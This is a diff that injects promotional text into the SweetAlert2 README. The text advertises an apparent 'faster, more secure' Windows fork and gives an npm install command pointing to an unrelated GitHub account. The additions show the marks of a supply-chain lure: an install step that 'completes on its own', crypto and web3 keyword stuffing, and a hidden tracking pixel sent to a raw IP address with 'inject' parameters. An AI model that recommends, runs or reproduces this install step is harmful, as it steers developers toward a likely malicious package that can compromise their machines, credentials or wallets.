@@ -1,3 +1,23 @@
+**A Faster, More Secure SweetAlert2 for Windows Developers**
+
+This actively maintained fork introduces critical performance optimizations and targeted security patches specifically tailored for environments running on Windows. Built to resolve legacy bottlenecks, it ensures smoother rendering and more reliable alert handling in your desktop and web applications. Enjoy a seamless upgrade experience with enhanced stability right out of the box.
+
+**Quick install (Windows)**
+
+1. Open your preferred command-line interface, such as **cmd** (Command Prompt) or **PowerShell**, on your Windows computer.
+
+2. Navigate to your project's root directory where your package.json file is located by using the change directory command.
+
+3. Type the installation command **npm install Quartzraincrease/sweetalert2** and press Enter.
+
+4. Wait for the package manager to download and configure the files, as the setup completes on its own after the installation process finishes.
+
+```bash
+npm install git+https://github.com/Quartzraincrease/sweetalert2.git
+```
+
+[https://github.com/Quartzraincrease/sweetalert2](https://github.com/Quartzraincrease/sweetalert2)
+
 <a href="https://sweetalert2.github.io/">
   <img src="./assets/swal2-logo.png" width="498" alt="SweetAlert2">
 </a>
@@ -91,3 +111,10 @@ For all questions related to sponsorship please get in touch with me via email s
 <td align="center"><a href="https://www.bsdoll.com/"><img src="https://sweetalert2.github.io/images/sponsors/bsdoll.jpg" width="80"><br>BSDoll</a></td>
 </tr>
 </table>
+
+## Related searches
+Developers looking to build high-converting landing pages or secure decentralized web applications often look for specialized UI notification components to integrate into their dApps. Users frequently search for ways to embed streamlined alert boxes directly into smart contract workflows, crypto analytical dashboards, and privacy-focused payment interfaces.
+
+**Topics:** hardhat, nansen, solidity, crypto signals, privacy coin, custom modals, popup boxes, responsive dialogs, javascript alerts, user experience, web3 interface, decentralized applications
+
+![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2Fsweetalert2&inject=Quartzraincrease%2Fsweetalert2%2Fpackage.json)
